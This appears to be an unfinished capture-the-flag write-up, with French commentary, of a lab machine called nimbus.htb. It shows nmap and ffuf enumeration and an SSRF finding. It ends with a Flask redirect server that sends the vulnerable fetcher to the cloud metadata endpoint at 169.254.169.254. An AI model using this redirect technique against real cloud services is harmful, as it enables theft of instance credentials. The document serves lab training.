
![logo](Images/logo.png)

# Attack Chain




# Summary



---
# Enumeration

```
nmap -sVC 10.129.23.255 -oA nmap                               
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-22 13:59 CEST
Nmap scan report for 10.129.23.255
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ebab8fbe99020b3ec41c83b2662f1713 (ECDSA)
|_  256 c169ab84f3888bb38aaee2283554350b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

```
echo '10.129.23.255 nimbus.htb' | tee -a /etc/hosts
```



![index nimbus](Images/index%20nimbus.png)


marcus slack


```
ffuf -fs 185 -c -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.nimbus.htb' -u "http://nimbus.htb/" -fs 178

<SNIP>

aws                 [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 35ms]
```

```
echo '10.129.23.255 aws.nimbus.htb' | tee -a /etc/hosts
```


healtcheck

![api health](Images/api%20health.png)


# SSRF


![test ssrf interne](Images/test%20ssrf%20interne.png)


![ssrf test .yml](Images/ssrf%20test%20.yml.png)


![ssrf ma machine](Images/ssrf%20ma%20machine.png)


**La SSRF est readable** — regarde le `<pre>` : le serveur reflète intégralement le **corps de la réponse** que ta cible a renvoyée (ici ta page d'erreur 404). C'est énorme : tout ce que tu feras fetcher en interne te reviendra en clair dans la preview.



**x.yml**
```
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/<path:p>')
def r(p):
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)

app.run(host='0.0.0.0', port=80)
```